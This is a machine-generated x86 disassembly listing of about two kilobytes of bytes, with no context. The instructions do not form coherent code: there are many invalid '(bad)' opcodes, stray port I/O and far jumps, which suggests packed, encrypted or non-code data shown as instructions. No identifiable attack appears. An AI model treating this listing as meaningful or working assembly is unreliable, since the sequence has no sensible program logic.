  40d232:	in     al,dx
  40d233:	xor    BYTE PTR [edx+0xfc9ff0e],ch
  40d239:	ret    
  40d23a:	or     DWORD PTR [ecx+0x9],esi
  40d23d:	and    dl,BYTE PTR [esi]
  40d23f:	and    eax,0xb3ec5619
  40d244:	gs into 
  40d246:	push   ecx
  40d247:	sbb    BYTE PTR [edx+0x4e],ah
  40d24a:	addr16 jmp 0x40a:0x3ad3301a
  40d252:	cmp    al,0x97
  40d254:	xchg   ecx,eax
  40d255:	sbb    cl,dl
  40d257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d258:	pop    esp
  40d259:	fwait
  40d25a:	sahf   
  40d25b:	jbe    0x40d20f
  40d25d:	pop    edx
  40d25e:	pushf  
  40d25f:	out    dx,al
  40d260:	sub    eax,0x5d47dd48
  40d265:	inc    eax
  40d266:	das    
  40d267:	xor    BYTE PTR [esi],ch
  40d269:	and    esi,0xd1457486
  40d26f:	sbb    eax,0xd90ae606
  40d274:	not    DWORD PTR fs:[eax-0xef131fc]
  40d27b:	scas   al,BYTE PTR es:[edi]
  40d27c:	mov    ebp,0xbf33f534
  40d281:	fiadd  WORD PTR [ebp+ecx*4+0x15]
  40d285:	dec    eax
  40d286:	je     0x40d2ea
  40d288:	jbe    0x40d20d
  40d28a:	mov    edx,0x4dfebec0
  40d28f:	or     bl,BYTE PTR [edi+0xc69a475]
  40d295:	cmc    
  40d296:	lea    edx,[ecx+ebx*4-0x1510beba]
  40d29d:	loop   0x40d291
  40d29f:	outs   dx,DWORD PTR ds:[esi]
  40d2a0:	push   ds
  40d2a1:	dec    ebp
  40d2a2:	ret    0xdd7b
  40d2a5:	jecxz  0x40d27d
  40d2a7:	aaa    
  40d2a8:	(bad)  
  40d2a9:	xlat   BYTE PTR ds:[ebx]
  40d2aa:	push   esp
  40d2ab:	addr16 dec edx
  40d2ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2ae:	js     0x40d2f5
  40d2b0:	les    esi,FWORD PTR [esi-0x7d]
  40d2b3:	pop    es
  40d2b4:	jns    0x40d2f6
  40d2b6:	loope  0x40d26b
  40d2b8:	gs or  ecx,ebp
  40d2bb:	daa    
  40d2bc:	nop
  40d2bd:	add    edi,DWORD PTR [ebx]
  40d2bf:	ds sbb eax,0xde1c46bc
  40d2c5:	pop    ecx
  40d2c6:	inc    ecx
  40d2c7:	jns    0x40d2f1
  40d2c9:	gs cmp bl,cl
  40d2cc:	inc    ebp
  40d2cd:	pop    ecx
  40d2ce:	stos   DWORD PTR es:[edi],eax
  40d2cf:	stos   BYTE PTR es:[edi],al
  40d2d0:	inc    esi
  40d2d1:	adc    DWORD PTR [edx+0x39549422],0x5b
  40d2d8:	add    BYTE PTR [ebx],cl
  40d2da:	xchg   edx,eax
  40d2db:	ja     0x40d266
  40d2dd:	and    al,0x9b
  40d2df:	rcr    DWORD PTR [edx+0xf],cl
  40d2e2:	and    al,0xcf
  40d2e4:	out    dx,al
  40d2e5:	fidiv  DWORD PTR [esi+esi*1+0x7ccbaf9a]
  40d2ec:	fcmovnu st,st(6)
  40d2ee:	cdq    
  40d2ef:	and    eax,0xd17ec51e
  40d2f4:	ins    DWORD PTR es:[edi],dx
  40d2f5:	lods   al,BYTE PTR ds:[esi]
  40d2f7:	xor    eax,0x49004a98
  40d2fc:	enter  0x4e1b,0x73
  40d300:	fldcw  WORD PTR [eax]
  40d302:	(bad)  
  40d303:	dec    edi
  40d304:	mov    ch,BYTE PTR [esp+eiz*4-0x13]
  40d308:	push   edx
  40d309:	ins    BYTE PTR es:[edi],dx
  40d30a:	adc    eax,0x4de22f6c
  40d30f:	leave  
  40d310:	pusha  
  40d311:	xchg   BYTE PTR es:[esi-0x4cd6c192],al
  40d318:	add    eax,0x34247580
  40d31d:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40d31f:	sub    eax,0xc5b7cd5b
  40d324:	jbe    0x40d313
  40d326:	shl    DWORD PTR [ecx+0x24cc0ba5],0xfd
  40d32d:	sbb    DWORD PTR [ebp+eiz*8-0x632d9c20],ebp
  40d334:	mov    gs,WORD PTR [ecx]
  40d336:	jnp    0x40d325
  40d338:	lods   al,BYTE PTR ds:[esi]
  40d339:	inc    edx
  40d33a:	aad    0x0
  40d33c:	jo     0x40d38e
  40d33e:	push   es
  40d33f:	mov    ds:0x2ec183e9,al
  40d344:	add    DWORD PTR [eax],ebp
  40d346:	nop
  40d347:	out    0xea,eax
  40d349:	sbb    eax,0xca3becc5
  40d34e:	push   ecx
  40d34f:	push   es
  40d350:	mov    esi,0xc2eddf52
  40d355:	loop   0x40d335
  40d357:	mov    WORD PTR [ebp+0x5],?
  40d35a:	mov    WORD PTR [ecx*1+0x5bfdc529],gs
  40d361:	inc    edx
  40d362:	ins    BYTE PTR es:[edi],dx
  40d363:	(bad)  
  40d365:	mov    cl,0xc9
  40d367:	sub    DWORD PTR [esi-0x1c85ab72],edi
  40d36d:	aad    0x47
  40d36f:	in     al,dx
  40d370:	mov    al,0x2f
  40d373:	loope  0x40d36e
  40d375:	jle    0x40d31f
  40d377:	fstp   TBYTE PTR [ebp-0x69097666]
  40d37d:	shr    ebx,0xdb
  40d380:	inc    ecx
  40d381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d382:	cmp    al,0xdf
  40d384:	outs   dx,BYTE PTR ds:[esi]
  40d385:	push   esi
  40d386:	rcr    BYTE PTR [esi],1
  40d388:	mov    BYTE PTR [eax-0x1ed5585f],bl
  40d38e:	jge    0x40d400
  40d390:	jmp    0x40d333
  40d392:	stc    
  40d393:	(bad)  
  40d394:	xchg   ebx,eax
  40d395:	add    DWORD PTR [eax],esi
  40d397:	push   ebp
  40d398:	retf   
  40d399:	xchg   bl,dh
  40d39b:	icebp  
  40d39c:	dec    ecx
  40d39d:	daa    
  40d39e:	ds inc esp
  40d3a0:	in     eax,0xbf
  40d3a2:	push   ebp
  40d3a3:	inc    ebp
  40d3a4:	frstor [ecx-0x2]
  40d3a7:	fs and al,0x91
  40d3aa:	push   esp
  40d3ab:	shl    BYTE PTR [edx-0x7ba73f63],cl
  40d3b1:	(bad)
  40d3b4:	(bad)  
  40d3b6:	sbb    ecx,0x91986e62
  40d3bc:	jb     0x40d421
  40d3be:	dec    ebp
  40d3bf:	loop   0x40d3cb
  40d3c1:	je     0x40d35b
  40d3c3:	sar    DWORD PTR [esi-0x258e5d53],0xfe
  40d3ca:	sahf   
  40d3cb:	sbb    dl,dl
  40d3cd:	jae    0x40d440
  40d3cf:	clc    
  40d3d0:	add    BYTE PTR [eax],0x13
  40d3d3:	xchg   ebx,eax
  40d3d4:	add    BYTE PTR [edx+ebp*4+0x5928e230],bl
  40d3db:	mov    WORD PTR [ebx+0x76],cs
  40d3de:	aam    0x44
  40d3e0:	ret    
  40d3e1:	sub    al,0x67
  40d3e3:	mov    al,0xbb
  40d3e5:	enter  0x6eca,0xb6
  40d3e9:	mov    dh,bl
  40d3eb:	add    bh,BYTE PTR cs:[eax]
  40d3ee:	in     eax,0x65
  40d3f0:	mov    WORD PTR [ebp+0x0],cs
  40d3f3:	mov    ds:0xe8902fb0,eax
  40d3f8:	sbb    al,0x4
  40d3fa:	sub    dl,BYTE PTR [eax-0xa]
  40d3fd:	dec    ecx
  40d3fe:	int    0x7e
  40d400:	je     0x40d394
  40d402:	nop
  40d403:	sbb    al,0xc0
  40d405:	dec    ecx
  40d406:	xchg   edi,eax
  40d407:	loopne 0x40d3ba
  40d409:	pop    edi
  40d40a:	jle    0x40d3b9
  40d40c:	sub    ch,al
  40d40e:	or     dh,ch
  40d410:	scas   eax,DWORD PTR es:[edi]
  40d411:	fnstcw WORD PTR [edi+ebp*2-0x2323ae81]
  40d418:	out    0xbe,al
  40d41a:	inc    ebx
  40d41b:	dec    ecx
  40d41c:	mov    esp,0xfc620410
  40d421:	and    cl,BYTE PTR [ecx]
  40d423:	(bad)  
  40d424:	pop    edx
  40d425:	mov    ebp,0x4032438b
  40d42a:	test   BYTE PTR [ecx+0x14],dh
  40d42d:	sti    
  40d42e:	mov    al,ds:0x9bd0ce8f
  40d433:	adc    DWORD PTR [ebp+0x64],edx
  40d436:	mov    ss:0xb4d7197d,al
  40d43c:	call   0xe40e:0xa33b330a
  40d443:	add    BYTE PTR [ecx+0x5ff2353d],dl
  40d449:	push   ax
  40d44b:	in     eax,dx
  40d44c:	jne    0x40d4aa
  40d44e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d44f:	jnp    0x40d443
  40d451:	mov    ebx,0x55e8c1d1
  40d456:	xlat   BYTE PTR ds:[ebx]
  40d457:	inc    eax
  40d458:	(bad)  
  40d459:	jmp    FWORD PTR [eax]
  40d45b:	push   0xffffffae
  40d45d:	xchg   ecx,ecx
  40d45f:	pop    edi
  40d460:	xchg   ecx,eax
  40d461:	(bad)  
  40d462:	sti    
  40d463:	push   ds
  40d464:	in     al,dx
  40d465:	shl    BYTE PTR [ebx+0x46],1
  40d468:	mov    DWORD PTR [ecx-0x58],eax
  40d46b:	push   edx
  40d46c:	jno    0x40d4e0
  40d46e:	hlt    
  40d46f:	mov    ah,0x61
  40d471:	mov    ah,0xb0
  40d473:	or     al,0x56
  40d475:	dec    esi
  40d476:	inc    edx
  40d477:	loope  0x40d4d9
  40d479:	xchg   esp,eax
  40d47a:	inc    eax
  40d47b:	daa    
  40d47c:	dec    ebx
  40d47d:	pop    esi
  40d47e:	cs ret 0xeec2
  40d482:	cdq    
  40d483:	nop
  40d484:	adc    al,0xaf
  40d486:	icebp  
  40d487:	bound  esi,QWORD PTR [edx-0x3b]
  40d48a:	xchg   edi,eax
  40d48b:	pop    ebp
  40d48c:	push   esi
  40d48d:	in     eax,dx
  40d48e:	adc    eax,0xb287edf2
  40d493:	jg     0x40d4fa
  40d495:	mov    ebp,0x87b81f26
  40d49a:	outs   dx,DWORD PTR ds:[esi]
  40d49b:	jb     0x40d435
  40d49d:	scas   al,BYTE PTR es:[edi]
  40d49e:	inc    edi
  40d49f:	jg     0x40d48b
  40d4a1:	sti    
  40d4a2:	jle    0x40d454
  40d4a4:	daa    
  40d4a5:	int    0xed
  40d4a7:	aam    0xc2
  40d4a9:	mov    dh,0xd
  40d4ab:	es pusha 
  40d4ad:	jb     0x40d4fe
  40d4af:	ror    ah,cl
  40d4b1:	jo     0x40d501
  40d4b3:	push   cs
  40d4b4:	push   0x67
  40d4b6:	jmp    0x40d449
  40d4b8:	xchg   ebp,eax
  40d4b9:	adc    eax,0xa95581d2
  40d4be:	stos   DWORD PTR es:[edi],eax
  40d4bf:	inc    esp
  40d4c0:	xor    DWORD PTR [eax],edx
  40d4c2:	jne    0x40d514
  40d4c4:	ret    0x2a6d
  40d4c7:	pop    edx
  40d4c8:	imul   DWORD PTR [edx-0x7]
  40d4cb:	jo     0x40d4fd
  40d4cd:	mov    ch,0xeb
  40d4cf:	adc    dl,al
  40d4d1:	or     bh,BYTE PTR [ebp+0x46746d19]
  40d4d7:	pusha  
  40d4d8:	mov    dl,0x97
  40d4da:	mov    bl,BYTE PTR [esi]
  40d4dc:	hlt    
  40d4dd:	icebp  
  40d4de:	pusha  
  40d4df:	push   cs
  40d4e0:	ins    DWORD PTR es:[edi],dx
  40d4e1:	rcr    DWORD PTR [esi-0x3c68f0f8],1
  40d4e7:	or     DWORD PTR [edi+edx*8-0x292163cc],0x3e
  40d4ef:	test   DWORD PTR [ecx-0x79619c0a],edi
  40d4f5:	das    
  40d4f6:	inc    DWORD PTR [edx+0x50ba9f99]
  40d4fc:	push   ebp
  40d4fd:	or     al,0x8a
  40d4ff:	add    edi,esp
  40d501:	add    al,0xd4
  40d503:	(bad)  
  40d504:	mov    edi,0x2ad8397f
  40d509:	xchg   edi,eax
  40d50a:	imul   ah
  40d50c:	push   ds
  40d50d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d50e:	sahf   
  40d50f:	loopne 0x40d526
  40d511:	clc    
  40d512:	pop    edi
  40d513:	ficomp WORD PTR [edx+0x4098ae92]
  40d519:	popa   
  40d51a:	mov    dh,0x59
  40d51c:	in     al,0xfd
  40d51e:	xor    eax,0x8fad600a
  40d523:	inc    esi
  40d524:	lea    esp,[esi]
  40d526:	ret    0x54d5
  40d529:	cdq    
  40d52a:	mov    ds:0x926021b4,al
  40d52f:	(bad)
  40d532:	push   0x75bf7141
  40d537:	pushf  
  40d538:	sbb    eax,0x85268697
  40d53d:	dec    eax
  40d53e:	sbb    DWORD PTR [ebx],esi
  40d540:	inc    eax
  40d541:	mov    esp,0x4a3feb45
  40d546:	fs xchg ch,bh
  40d549:	xchg   ebp,eax
  40d54a:	pop    ss
  40d54b:	das    
  40d54c:	xor    eax,0x2da6f612
  40d551:	sub    eax,0x92a37696
  40d556:	not    DWORD PTR [esi+0x2255a5d3]
  40d55c:	shl    BYTE PTR [eax+0x6c1320fc],0xaa
  40d563:	mov    bh,BYTE PTR [ebp+0x68c66921]
  40d569:	(bad)  [edi+0x27]
  40d56c:	sub    edi,ecx
  40d56e:	neg    DWORD PTR [ebp+ebx*1+0x69]
  40d572:	les    ebp,FWORD PTR [eax+0x40]
  40d575:	jnp    0x40d54b
  40d577:	pop    esp
  40d578:	mov    ecx,0xe4e0c01e
  40d57d:	or     ebx,esp
  40d57f:	out    0x37,eax
  40d581:	sub    al,0x84
  40d583:	push   0xb6f5107a
  40d588:	mov    edx,0xa6d7a686
  40d58d:	loop   0x40d5d1
  40d58f:	sbb    DWORD PTR [edi+0x7517909b],esi
  40d595:	stc    
  40d596:	or     BYTE PTR [edi],ah
  40d598:	data16 jecxz 0x40d581
  40d59b:	lods   eax,DWORD PTR ds:[esi]
  40d59c:	jae    0x40d541
  40d59e:	lea    esi,es:[esi]
  40d5a1:	rcr    DWORD PTR [edi],cl
  40d5a3:	das    
  40d5a4:	sub    BYTE PTR [edi+0x2dff4d3f],dl
  40d5aa:	aas    
  40d5ab:	cwde   
  40d5ac:	test   DWORD PTR [eax+0x7e],edi
  40d5af:	add    DWORD PTR [edi+eiz*8+0x10],ebp
  40d5b3:	fdivr  st(5),st
  40d5b5:	jmp    0x2fbae022
  40d5ba:	pop    ebp
  40d5bb:	and    al,0x71
  40d5bd:	inc    ebx
  40d5be:	push   0x10
  40d5c0:	cmp    DWORD PTR [bx+si+0x49],ebx
  40d5c4:	push   ebp
  40d5c5:	dec    ebx
  40d5c6:	call   0xed81:0x9744c9b5
  40d5cd:	mov    gs,WORD PTR [edx]
  40d5cf:	dec    ecx
  40d5d0:	loopne 0x40d555
  40d5d2:	ja     0x40d57b
  40d5d4:	retf   
  40d5d5:	dec    esp
  40d5d6:	adc    al,0xf4
  40d5d8:	mov    ebx,0x70fbc0a7
  40d5dd:	cmp    eax,0x2a2f3d11
  40d5e2:	adc    DWORD PTR [eax+0x70],edi
  40d5e5:	mov    ds:0xe7cf36c6,eax
  40d5ea:	data16 popw ds
  40d5ed:	cld    
  40d5ee:	mov    ds:0x2c32e42f,al
  40d5f3:	xchg   ecx,eax
  40d5f4:	mov    edx,edx
  40d5f6:	call   0x7cdadecf
  40d5fb:	ins    DWORD PTR es:[edi],dx
  40d5fc:	aaa    
  40d5fd:	xchg   edi,eax
  40d5fe:	pop    ds
  40d5ff:	mov    esp,DWORD PTR [eax+0x8]
  40d602:	lahf   
  40d603:	push   ds
  40d604:	test   dl,bh
  40d606:	or     DWORD PTR [edi-0x5146b649],ecx
  40d60c:	aas    
  40d60d:	cmp    BYTE PTR [edi+0x30],ah
  40d610:	or     ch,bh
  40d612:	daa    
  40d613:	pop    DWORD PTR [ebp+0x425350b9]
  40d619:	dec    esi
  40d61a:	fidivr WORD PTR [ebx]
  40d61c:	mov    eax,ds:0x5e38082
  40d621:	xchg   ebp,eax
  40d622:	imul   edi,DWORD PTR [esi+esi*8-0x44],0xf7ebce25
  40d62a:	xor    al,0x1a
  40d62c:	daa    
  40d62d:	sub    DWORD PTR [edx+eiz*2-0x74],ebx
  40d631:	xchg   esp,eax
  40d632:	idiv   edx
  40d634:	das    
  40d635:	jne    0x40d65a
  40d637:	jns    0x40d601
  40d639:	jb     0x40d615
  40d63b:	out    dx,eax
  40d63c:	fs jge 0x40d5e2
  40d63f:	xor    ecx,DWORD PTR [edi-0x68]
  40d642:	mov    edx,0x68aa400f
  40d647:	es adc ebp,esi
  40d64a:	inc    esi
  40d64b:	push   es
  40d64c:	mov    ds:0x4d716967,al
  40d651:	xor    DWORD PTR [eax+ebx*4],eax
  40d654:	xor    eax,0xe742d2e8
  40d659:	mov    dh,0x3b
  40d65b:	in     al,0x90
  40d65d:	push   esp
  40d65e:	imul   ebx,DWORD PTR [ecx+eax*2],0x7329335e
  40d665:	fcom   st(0)
  40d667:	outs   dx,DWORD PTR ds:[esi]
  40d668:	iret   
  40d669:	jmp    0xf00b4551
  40d66e:	idiv   BYTE PTR [edi]
  40d670:	into   
  40d671:	addr16 (bad) 
  40d673:	xchg   ebx,eax
  40d674:	sbb    ebp,DWORD PTR [esi]
  40d676:	ins    BYTE PTR es:[edi],dx
  40d677:	jle    0x40d6f2
  40d679:	dec    ebx
  40d67a:	test   DWORD PTR [edi-0x68a948c3],esp
  40d680:	xchg   BYTE PTR [ebx+0x4d39cf95],dl
  40d686:	cmp    BYTE PTR [esi+0x2d],cl
  40d689:	addr16 xchg edi,eax
  40d68b:	xor    al,0x1e
  40d68d:	cmp    DWORD PTR [eax],esp
  40d68f:	or     DWORD PTR [ecx-0x28],esp
  40d692:	push   esi
  40d693:	fstp   QWORD PTR [esi]
  40d695:	mov    edx,esp
  40d697:	fs loopne 0x40d714
  40d69a:	imul   edx,DWORD PTR [esi-0x1a8d59e3],0x5e
  40d6a1:	mov    edx,esp
  40d6a3:	call   0x8a6dcd92
  40d6a8:	imul   ecx,DWORD PTR [edi],0xbfa591e9
  40d6ae:	aaa    
  40d6af:	scas   al,BYTE PTR es:[edi]
  40d6b0:	adc    dl,BYTE PTR [ebx-0x534e947b]
  40d6b6:	gs jmp 0x3017:0x49fad15
  40d6be:	sbb    eax,0xcde8fdad
  40d6c3:	shr    DWORD PTR [ecx-0x18c9bdff],cl
  40d6c9:	and    ah,BYTE PTR [edi-0x7808c2c2]
  40d6cf:	loope  0x40d6f1
  40d6d1:	loop   0x40d708
  40d6d3:	imul   edx,eax,0x45
  40d6d6:	test   al,0xe9
  40d6d8:	ror    BYTE PTR [ecx+0x74],cl
  40d6db:	jno    0x40d6fd
  40d6dd:	push   ds
  40d6de:	imul   eax,DWORD PTR [ebx],0xffffffe2
  40d6e1:	je     0x40d694
  40d6e3:	add    BYTE PTR [ecx-0x63],dh
  40d6e6:	test   esp,eax
  40d6e8:	push   ebp
  40d6e9:	sar    BYTE PTR [esi+0x67],1
  40d6ec:	jge    0x40d699
  40d6ee:	inc    ebx
  40d6ef:	or     BYTE PTR [ecx-0x4d],ah
  40d6f2:	test   eax,0xa1c6f55
  40d6f7:	dec    esi
  40d6f8:	xchg   esi,eax
  40d6f9:	dec    esp
  40d6fa:	jno    0x40d751
  40d6fc:	lea    ebx,[edi+0x4a]
  40d6ff:	inc    ecx
  40d700:	loope  0x40d729
  40d702:	sahf   
  40d703:	and    esp,DWORD PTR [edi-0x31c5b8a6]
  40d709:	lds    ecx,FWORD PTR [edx-0x6f]
  40d70c:	mov    al,0x84
  40d70e:	mov    bh,0x28
  40d710:	adc    al,0xf7
  40d712:	cmp    DWORD PTR [eax+edi*1],ebx
  40d715:	enter  0xff7e,0x96
  40d719:	cwde   
  40d71a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d71b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d71c:	loope  0x40d771
  40d71e:	(bad)  
  40d71f:	sahf   
  40d720:	ret    
  40d721:	out    dx,eax
  40d722:	xor    esi,DWORD PTR [esi-0x72fa9419]
  40d728:	sar    edi,0x4b
  40d72b:	push   eax
  40d72c:	xchg   BYTE PTR [eax],bl
  40d72e:	cli    
  40d72f:	pop    esp
  40d730:	sbb    ch,BYTE PTR [esi-0x60e2f612]
  40d736:	test   eax,0xf3e904a
  40d73b:	jno    0x40d770
  40d73d:	ret    0xe8bc
  40d740:	inc    ecx
  40d741:	fsub   QWORD PTR [edi+0x282c31c6]
  40d747:	push   edx
  40d748:	or     DWORD PTR [ebp-0x20],esp
  40d74b:	repnz aad 0x97
  40d74e:	adc    ebx,DWORD PTR [esi]
  40d750:	ret    
  40d751:	jo     0x40d7b6
  40d753:	sbb    al,BYTE PTR [ebp+0x39820473]
  40d759:	sub    eax,0x785596de
  40d75e:	into   
  40d75f:	dec    eax
  40d761:	jle    0x40d799
  40d763:	rol    bl,cl
  40d765:	sahf   
  40d766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d767:	enter  0x3100,0x19
  40d76b:	aad    0x1e
  40d76d:	lods   eax,DWORD PTR ds:[esi]
  40d76e:	out    dx,al
  40d76f:	cmp    al,0xa7
  40d771:	xor    esp,DWORD PTR [ebx+0x2f97ace4]
  40d777:	jge    0x40d742
  40d779:	clc    
  40d77a:	sub    ebp,DWORD PTR [ecx]
  40d77c:	shl    al,cl
  40d77e:	add    ch,BYTE PTR [esi]
  40d780:	or     DWORD PTR [edx+0x1e],0x1a296aed
  40d787:	xchg   edi,eax
  40d788:	aam    0xf4
  40d78a:	mov    eax,ds:0x6f2a3aa8
  40d78f:	or     DWORD PTR ds:0xc4585a5e,edx
  40d795:	xchg   ebp,esi
  40d797:	xchg   ebx,eax
  40d798:	(bad)  
  40d79a:	mov    edi,0xd04b772d
  40d79f:	sub    eax,DWORD PTR [ebx+edi*4-0x46adfa25]
  40d7a6:	jge    0x40d81b
  40d7a8:	or     DWORD PTR [ebx+0xc913dd2],0xffffffc3
  40d7af:	xchg   DWORD PTR [ecx-0xc9c7326],esp
  40d7b5:	pop    ecx
  40d7b6:	imul   edi,DWORD PTR [esi],0x17
  40d7b9:	loop   0x40d7de
  40d7bb:	retf   
  40d7bc:	dec    ebx
  40d7bd:	(bad)  
  40d7be:	xchg   edx,eax
  40d7bf:	iret   
  40d7c0:	in     eax,0xa8
  40d7c2:	inc    ebx
  40d7c3:	sbb    DWORD PTR [ebx+0x298e4553],ebx
  40d7c9:	mov    dh,BYTE PTR [esi-0x10]
  40d7cc:	adc    bl,BYTE PTR [eax-0x67]
  40d7cf:	dec    ebx
  40d7d0:	jno    0x40d81b
  40d7d2:	xchg   ecx,eax
  40d7d3:	sub    al,BYTE PTR [esi]
  40d7d5:	pop    ebp
  40d7d6:	cmp    al,0x4e
  40d7d8:	or     cl,BYTE PTR [ebx-0x7b]
  40d7db:	mov    eax,ds:0xa07b17d3
  40d7e0:	push   edx
  40d7e1:	xor    al,0x36
  40d7e3:	call   0xcf52:0x889e9d87
  40d7ea:	daa    
  40d7eb:	adc    BYTE PTR [ebx],bl
  40d7ed:	sbb    eax,0xf0c847db
  40d7f2:	fnstcw WORD PTR [ebx+0x662144a6]
  40d7f8:	xchg   BYTE PTR ds:0x257875fc,dh
  40d7fe:	push   eax
  40d7ff:	enter  0x6cc1,0x71
  40d803:	dec    esp
  40d804:	cwde   
  40d805:	and    esi,DWORD PTR [ecx+0x73aff56b]
  40d80b:	pop    edi
  40d80c:	mov    ebp,0x3e53e651
  40d811:	ss or  edi,edx
  40d814:	mov    ecx,0x1401d186
  40d819:	in     al,0x56
  40d81b:	scas   al,BYTE PTR es:[edi]
  40d81c:	fsin   
  40d81e:	enter  0x6f86,0xc6
  40d822:	pop    ebx
  40d823:	sbb    eax,0x38b1d3c9
  40d828:	mov    dl,BYTE PTR [eax+edx*8+0x6ff62d85]
  40d82f:	push   0xa264e48e
  40d834:	cs push ds
  40d836:	or     BYTE PTR [esi+0x1ca541c1],0x9c
  40d83d:	add    bl,BYTE PTR ds:0xd9414701
  40d843:	bound  ebp,QWORD PTR [ecx+0x20]
  40d846:	mov    edx,0xa7d400ae
  40d84b:	(bad)  
  40d84c:	arpl   dx,cx
  40d84e:	add    ah,BYTE PTR [esi]
  40d850:	pop    esi
  40d851:	dec    DWORD PTR [ecx]
  40d853:	dec    BYTE PTR cs:[eax]
  40d856:	xchg   BYTE PTR [eax],ah
  40d858:	ret    
  40d859:	imul   esi,DWORD PTR [esi],0x5e
  40d85c:	sbb    al,0x43
  40d85e:	mov    DWORD PTR [esi],ebx
  40d860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d861:	mov    al,ds:0x6d839219
  40d866:	jecxz  0x40d7ef
  40d868:	mov    cl,0xb8
  40d86a:	jle    0x40d85d
  40d86c:	pop    ecx
  40d86d:	clc    
  40d86e:	stc    
  40d86f:	add    ah,bh
  40d871:	jno    0x40d853
  40d873:	lods   eax,DWORD PTR ds:[esi]
  40d874:	lds    ebx,FWORD PTR [esi+0x35]
  40d877:	js     0x40d827
  40d879:	setb   BYTE PTR [edx-0x42]
  40d87d:	sbb    DWORD PTR [esi],edi
  40d87f:	dec    ebx
  40d880:	dec    edx
  40d881:	xchg   esi,eax
  40d882:	xor    al,0xc
  40d884:	cmp    DWORD PTR [eax+esi*8-0x3b],edi
  40d888:	mov    al,ds:0x6f786684
  40d88d:	sub    eax,0x19310ac6
  40d892:	aaa    
  40d893:	jmp    0x40d8ed
  40d895:	pop    esi
  40d896:	xchg   ebp,eax
  40d897:	mov    ebx,0x31dbfb52
  40d89c:	jle    0x40d84a
  40d89e:	push   ebp
  40d89f:	xor    ecx,DWORD PTR [edi-0x4e4673ce]
  40d8a5:	icebp  
  40d8a6:	std    
  40d8a7:	shl    bl,0xa1
  40d8aa:	ds jne 0x40d865
  40d8ad:	repz jns 0x40d855
  40d8b0:	rol    BYTE PTR [edi+0x47],cl
  40d8b3:	fs jecxz 0x40d8ee
  40d8b6:	int    0x38
  40d8b8:	xor    BYTE PTR [ebp+0x75b03fc4],bh
  40d8be:	nop
  40d8bf:	adc    BYTE PTR [edx+0x4b],bl
  40d8c2:	pop    esi
  40d8c3:	dec    ebp
  40d8c4:	jns    0x40d896
  40d8c6:	xor    esp,esi
  40d8c8:	add    eax,DWORD PTR [ebp+0x5de8b99c]
  40d8ce:	xor    al,0xf0
  40d8d0:	jle    0x40d8cb
  40d8d2:	loope  0x40d8b8
  40d8d4:	mov    ds:0x9451a280,al
  40d8d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8da:	push   esi
  40d8db:	jmp    0xdd8a:0x35133c2
  40d8e2:	lods   al,BYTE PTR ds:[esi]
  40d8e3:	arpl   WORD PTR [edi-0x71981d45],dx
  40d8e9:	popa   
  40d8ea:	enter  0xa5fd,0xb9
  40d8ee:	js     0x40d876
  40d8f0:	sub    BYTE PTR [esi-0x68fc1079],cl
  40d8f6:	stos   DWORD PTR es:[edi],eax
  40d8f7:	add    BYTE PTR [edx],bh
  40d8f9:	js     0x40d884
  40d8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8fc:	popa   
  40d8fd:	sub    ebp,DWORD PTR [edi-0x74]
  40d900:	mov    edx,0xf340dba5
  40d905:	mov    ebp,0xe5b50415
  40d90a:	ficomp WORD PTR fs:[esi-0x4b]
  40d90e:	add    ebp,ebx
  40d910:	loope  0x40d8d9
  40d912:	out    0xb,al
  40d914:	jle    0x40d98c
  40d916:	push   0x3d0cedce
  40d91b:	push   ebp
  40d91c:	pop    es
  40d91d:	xchg   DWORD PTR [ebp-0x5fd04129],eax
  40d923:	mov    ds:0x89c19bd9,al
  40d928:	test   BYTE PTR [ebp+0x76],bh
  40d92b:	cmp    eax,0xf2f93b78
  40d930:	std    
  40d931:	mov    bl,0xcb
  40d933:	mov    WORD PTR [esi-0x7c],fs
  40d936:	cmp    DWORD PTR [ebp-0x61],edi
  40d939:	dec    edi
  40d93a:	push   esp
  40d93b:	pop    edi
  40d93c:	iret   
  40d93d:	pushf  
  40d93e:	and    BYTE PTR [edx-0xdb5656b],dl
  40d944:	sub    eax,0xe32448bc
  40d949:	sar    BYTE PTR [ebp-0x5e],1
  40d94c:	push   esi
  40d94d:	xchg   ebp,eax
  40d94e:	fdiv   DWORD PTR [ebx+ebx*4]
  40d951:	pusha  
  40d952:	cmp    BYTE PTR [eax+esi*8-0x10],0x61
  40d957:	sbb    bl,BYTE PTR [edi+0x1]
  40d95a:	lahf   
  40d95b:	(bad)  
  40d95c:	daa    
  40d95d:	dec    edi
  40d95e:	jg     0x40d903
  40d960:	bound  ebp,QWORD PTR [eax+ebp*8-0x55]
  40d964:	jmp    0x349b:0x1803425c
  40d96b:	dec    eax
  40d96c:	xchg   ebx,eax
  40d96d:	shl    eax,1
  40d96f:	data16 clc 
  40d971:	dec    esi
  40d972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d973:	pop    eax
  40d974:	(bad)  
  40d975:	movd   DWORD PTR [edx+0x4e],mm7
  40d979:	cs pop edi
  40d97b:	push   ds
  40d97c:	call   0x9a2b:0x9f371d5c
  40d983:	xchg   esi,eax
  40d984:	cld    
  40d985:	repnz mov eax,ds:0xb7043674
  40d98b:	in     eax,dx
  40d98c:	dec    ebp
  40d98d:	jp     0x40d927
  40d98f:	mov    ah,0x22
  40d991:	cmp    DWORD PTR [edx-0x36362d6d],0xffffffa4
  40d998:	push   ecx
  40d999:	mov    ecx,0xb3e3abde
  40d99e:	cmp    eax,0x82e2d442
  40d9a3:	test   DWORD PTR [esi],0x3a90596a
  40d9a9:	int3   
  40d9aa:	xchg   BYTE PTR [eax-0x5c],ah
  40d9ad:	sbb    DWORD PTR [edi+edx*8+0xa],ecx
  40d9b1:	jg     0x40da0e
  40d9b3:	inc    eax
  40d9b4:	in     eax,dx
  40d9b5:	sub    bh,al
